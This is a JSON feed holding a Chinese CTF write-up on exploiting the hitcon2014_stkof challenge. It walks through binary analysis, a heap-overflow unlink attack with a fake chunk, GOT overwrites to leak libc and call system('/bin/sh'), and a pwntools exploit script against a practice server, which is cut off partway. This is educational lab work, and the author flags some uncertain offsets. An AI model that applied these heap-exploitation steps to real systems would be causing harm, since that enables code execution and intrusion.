{
    "version": "https://jsonfeed.org/version/1",
    "title": "cumt-08213014-cyb • All posts by \"unlink\" category",
    "description": "",
    "home_page_url": "https://vvwwvv.cn",
    "items": [
        {
            "id": "https://vvwwvv.cn/2023/10/02/pwn/%E4%B8%93%E6%A0%8F/hitcon2014_stkof/",
            "url": "https://vvwwvv.cn/2023/10/02/pwn/%E4%B8%93%E6%A0%8F/hitcon2014_stkof/",
            "title": "hitcon2014_stkof（unlink）",
            "date_published": "2023-10-02T09:08:15.000Z",
            "content_html": "<h1 id=\"1程序分析\"><a class=\"anchor\" href=\"#1程序分析\">#</a> 1. 程序分析</h1>\n<p>64 位程序，没有开启 pie</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/02/pPLgmJU.png\" alt=\"\" /></p>\n<h2 id=\"利用ida进行分析\"><a class=\"anchor\" href=\"#利用ida进行分析\">#</a> 利用 ida 进行分析</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/02/pPLRev4.png\" alt=\"\" /></p>\n<p>发现是一个流程</p>\n<h3 id=\"当v31时\"><a class=\"anchor\" href=\"#当v31时\">#</a> 当 <code>v3=1</code>  时</h3>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/02/pPLRaqA.png\" alt=\"\" /></p>\n<p>此处先让我输入，然后根据输入的值开辟一个对应大小的堆</p>\n<pre><code>(&amp;::s)[++dword_602100] = v2;  这里是存放chunk地址的数组；\n这里是一个数组里面一个元素有八个字节，这里将我们开辟的堆的地址存放在这里\n前面的::s这是因为ida在编译伪代码的时候出现了一些问题，这个s和其他变量名重复了\n所以我们只需要选中`::`后面的s然后右键选择Rename global item更改一下变量名就可以了\n\nprintf(&quot;%d\\n&quot;, (unsigned int)dword_602100);\n这里也会打印上面数组的下标（dword_602100）\n</code></pre>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/02/pPLR7zF.png\" alt=\"\" /><br />\n从这里也发现了对应数组下标是从 <code>1</code>  开始的</p>\n<p><code>dword_602100</code>  在 bbs 段，地址是  <code>0x602100</code> ，不过它只存放对应数组下标，我们需要看数组地址，所以查看 <code>s</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/10/02/pPLRXZR.png\" alt=\"\" /></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/04/pPOR2nJ.png\" alt=\"\" /></p>\n<h3 id=\"当v32时\"><a class=\"anchor\" href=\"#当v32时\">#</a> 当 <code>v3=2</code>  时</h3>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/02/pPLfAcF.png\" alt=\"\" /></p>\n<p>fread 函数原型：</p>\n<pre><code>size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)\n- ptr 指向满足size_t nmemb最小尺寸的内存块的指针\n- size 要读取的每个元素的大小，以字节为单位。\n- nmemb 总共有多少个元素，每个元素的大小为size字节\n- stream  这时指向FILE对象的指针，该FILE对象指定了一个输入流\n\n返回值：成功读取的元素总数会以 size_t 对象返回，size_t 对象是一个整型数据类型。\n（如果总数与 nmemb 参数不同，则可能发生了一个错误或者到达了文件末尾）\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token function\">fread</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">,</span> <span class=\"token number\">1uLL</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">=</span> <span class=\"token function\">fread</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">,</span> <span class=\"token number\">1uLL</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    ptr <span class=\"token operator\">+=</span> i<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 移动指针</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    n <span class=\"token operator\">-=</span> i<span class=\"token punctuation\">;</span>      <span class=\"token comment\">// 输入多少字节就减多少</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里解释 <code>for</code>  的判断条件:</p>\n<pre><code>第一个fread是赋值给i要输入字节数的大小；\n当i&gt;0时,执行第二个fread；\n第二个fread是执行写入操作\n</code></pre>\n<h3 id=\"当v33时\"><a class=\"anchor\" href=\"#当v33时\">#</a> 当 <code>v3=3</code>  时</h3>\n<p>输入选择一个 chunk 并将其释放，因为指针被置 0，所以无法使用 uaf 漏洞<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/02/pPLhbQS.png\" alt=\"\" /></p>\n<h3 id=\"当v34时\"><a class=\"anchor\" href=\"#当v34时\">#</a> 当 <code>v3=4时</code></h3>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/02/pPL4dl8.png\" alt=\"\" /><br />\n这里只起判断长度的作用没有其他功能 (但是我们可以利用这个 puts 来输出)</p>\n<h1 id=\"2漏洞分析\"><a class=\"anchor\" href=\"#2漏洞分析\">#</a> 2. 漏洞分析</h1>\n<p>上面的代码分析里我们发现，当 <code>v3=2</code>  时，可以自己控制输入大小，这样我们就能够利用堆溢出漏洞，这里没有后门函数，所以需要我们泄露 libc 地址</p>\n<p>gdb 调试看一下：<br />\n这里先切换 glibc 版本为 <code>2.23-0ubuntu11.3_amd64</code></p>\n<p>创建分别 16，32，48 大小的堆块，查看一下</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/02/pPL5JuF.png\" alt=\"\" /></p>\n<p>这里看到 <code>红色框内</code> 的为我们创建的 chunk，而 <code>黄色框</code> 的 chunk 是因为系统没有创建 buf，所以就申请了缓冲区</p>\n<pre><code>按理说在gdb中时候用heap命令应该只会看到四个chunk(含top_chunk)，但是这次出现了六个chunk。\n多出来的两个chunk其实是由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区，即初次使用fget()函数和printf()函数的时候\n</code></pre>\n<p>通过上面发现的存储堆块的数组的地址来查看一下情况：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/03/pPO1RPK.png\" alt=\"\" /><br />\n通过图里我们可以发现，其对应的是 <code>chunk</code>  的 <code>data</code>  区域（上面的 chunk 地址 + 0x10）</p>\n<p>这里我们就可以根据这个数组的地址，改变数组存放的地址为该 <code>数组地址-0x18</code> ，但是此时这个 <code>减0x18</code>  的地址会被 <code>数组存放</code> 认为是个堆块，那么我们就能按地址顺序修改一系列数组内部的值为我们想要修改内容的 <code>地址</code> ，然后根据对应 <code>chunk编号</code> 来编辑我们已经修改过的 <code>数组内的地址</code> 的 <code>内容</code></p>\n<p>因为上面函数分析里发现有个 puts 函数，我们可以利用它来泄露 libc 地址</p>\n<p>这里是将数组存放的地址改为数组的开头，然后去访它让我们修改，我们修改了这个数组里存放的 chunk 地址为函数的 got 地址，然后再编辑这几个 chunk 时 其实改的是 got 内的函数真实地址，我们将 <code>free</code>  修改为 <code>system</code>  即可 getshell</p>\n<h1 id=\"3exp构造\"><a class=\"anchor\" href=\"#3exp构造\">#</a> 3.exp 构造：</h1>\n<p>从上面任意创建的堆块来看，我们创建的三个堆中，chunk1 被系统产生的堆块给分开了，这对我们想溢出产生了影响，那么我们就从我们创建的第二个 chunk 来溢出构造满足 unlink 漏洞</p>\n<h2 id=\"1申请堆块\"><a class=\"anchor\" href=\"#1申请堆块\">#</a> 1. 申请堆块</h2>\n<p>这里创建的堆块大小也有限制，因为我们不能将释放的堆块进入 fastbin 中，这会导致无法合并，所以释放的堆块要大于 0x80，chunk1 大小随意，chunk2 大小为 0x30（fake_chunk 的 pre_size、size、fd、bk、fd_nextpre、fd_nextsize）,chunk3 大小 0x80（小于 0x80 会进入 fastbin chunk 流程，无法按预期 unlink）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#这里不能是 0x90</span></pre></td></tr></table></figure><h2 id=\"2进行溢出\"><a class=\"anchor\" href=\"#2进行溢出\">#</a> 2. 进行溢出</h2>\n<p>这里需要改变的地方有两个一个是构造我们的 <code>fake_chunk</code>  使绕过 unlink 检查；另一个是改变 chunk3 的 pre_size 和 size 位的 p 标志符这样做是为了将我们构造的 fake_chunk 视为空闲块</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload1<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>P<span class=\"token operator\">-</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>P<span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#这里分别对应的是 fake_chunk 的 pre_size size、 fd、 bk、 fd_nextpre、 fd_nextsize</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload1<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#这里分别对应的是 chunk3 的 pre_size、size (这里的 size 是加上了 pre_size 和 size 的大小，所以比前面申请的大)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这里需要查找 P 的地址，在记录堆块地址的数组中，由于我们后续要释放 chunk3 想要触发 unlink 就要让其向前合并，那么就要将 chunk2 当作 unlink 的 P 的数组地址，（这里因为我们伪造了 <code>fake_chunk</code>  所以向前合并时合并的是我们伪造的 <code>chunk</code> ，但是仍然以存放的 chunk2 的数组地址来当中 chunk3 的上一个存放 chunk 的数组的地址）</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/04/pPOgvqA.png\" alt=\"\" /></p>\n<p>P 地址位存放 chunk2 的数组的地址， <code>P=0x602150</code></p>\n<h2 id=\"3释放导致unlink\"><a class=\"anchor\" href=\"#3释放导致unlink\">#</a> 3. 释放导致 <code>unlink</code></h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#gdb.attach(P)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>P<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>释放前：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/04/pPO2KiV.png\" alt=\"\" /></p>\n<p>释放后：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/04/pPORumd.png\" alt=\"\" /></p>\n<p>可以看到，free 后执行了 unlink，将 <code>0x602138</code>  写入 <code>0x602150</code>  中，前面已经知道了数组 ( <code>s</code> ) 的起始地址是 <code>0x602140</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/04/pPORvNt.png\" alt=\"\" /></p>\n<h2 id=\"4泄露libc地址\"><a class=\"anchor\" href=\"#4泄露libc地址\">#</a> 4. 泄露 libc 地址</h2>\n<p>当我们编辑 <code>chunk2</code>  时，相当于在 <code>0x602138</code>  上写入 <code>内容</code> ，那么我们可以通过这种方式来对 s 数组的内容进行修改，只不过是 s 是从 <code>0x602140</code>  开始，所以先要填充 8 个字节，前面程序执行过 free、puts、atoi 函数，我们可以写入他们的 got 地址进行改写函数的功能</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload2<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>free_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>atoi_got<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>发现修改成了函数地址：<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/04/pPOfMJP.png\" alt=\"\" /><br />\n<img data-src=\"https://z1.ax1x.com/2023/10/04/pPOfQRf.png\" alt=\"\" /><br />\n下面的可能有问题：<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/04/pPOWq2T.png\" alt=\"\" /><br />\n【这里有个问题，0x602140 是 s [0], 但是没有用，那我们的函数是不是应该填充两个 8 字节来占位】<br />\n这时我们修改 <code>数组存放</code> 的对应 <code>地址</code> 时修改的是函数 <code>got表内的地址</code></p>\n<p>我们先泄露 pus 的真实地址：</p>\n<p>修改 chunk2（此时 chunk2 为 <code>free_got</code> ）变为 <code>puts_plt</code> ，这样我们执行 free 时相当于执行 puts；这里我们需要一个参数，原本 <code>free(chunk1)</code>  会释放对应地址的 chunk，这时会变成 <code>puts(puts_got)</code> ，也就是说 <code>chunk1</code>  的地址成为了参数</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload3<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload3<span class=\"token punctuation\">)</span><span class=\"token operator\">//</span>改变free_got功能为puts</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span>相当于执行puts<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/10/04/pPOfdJ0.png\" alt=\"\" /></p>\n<p>接收：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>puts<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"OK\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/10/04/pPOfXfP.png\" alt=\"\" /></p>\n<p>可以看到接收的地址在 &quot;OK&quot; 的前面，就需要先接收地址</p>\n<h2 id=\"5计算system地址\"><a class=\"anchor\" href=\"#5计算system地址\">#</a> 5. 计算 system 地址：</h2>\n<p>我们已经得到了 puts 的真实地址，可以通过这个去得到 libc 的基址，然后计算得到 system 的真实地址：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>libc_base<span class=\"token operator\">=</span>puts<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>system<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>binsh<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b\"/bin/sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"system:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"binsh:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>泄露出了地址：<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/04/pPO4sa9.png\" alt=\"\" /></p>\n<h2 id=\"6获取shell\"><a class=\"anchor\" href=\"#6获取shell\">#</a> 6. 获取 shell</h2>\n<p>前面将 <code>free_got</code>  该成了 <code>puts</code>  泄露了地址，这里我们只需要以同样的方式将 <code>atoi</code>  改成 <code>system</code>  再往 atio 里输入 <code>/bin/sh</code>  来 <code>getshell</code>  即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload4<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 将 free 改为 system</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload4<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>payload5<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 将 atoi 改为 \"/bin/sh\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload5<span class=\"token punctuation\">)</span>  <span class=\"token comment\">#因为原本程序输入会调用 atoi，输入值为 atoi 的参数，那么这里就变成了输入值为 system 的参数（因为 atoi 变为了 system）</span></pre></td></tr></table></figure><h2 id=\"7完整exp\"><a class=\"anchor\" href=\"#7完整exp\">#</a> 7. 完整 exp：</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">29948</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./stkof\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>libc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./libc.so.6\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>puts_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>puts_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>atoi_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"atoi\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>free_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"free\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#p=process(\"./stkof\")</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>P<span class=\"token operator\">=</span><span class=\"token number\">0x602150</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">allocate</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"OK\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fill</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"OK\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token comment\">#p.recvuntil (\"OK\\n\")  #注意这里如果接收会影响后面接收地址</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Command: \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"4\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"37\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span 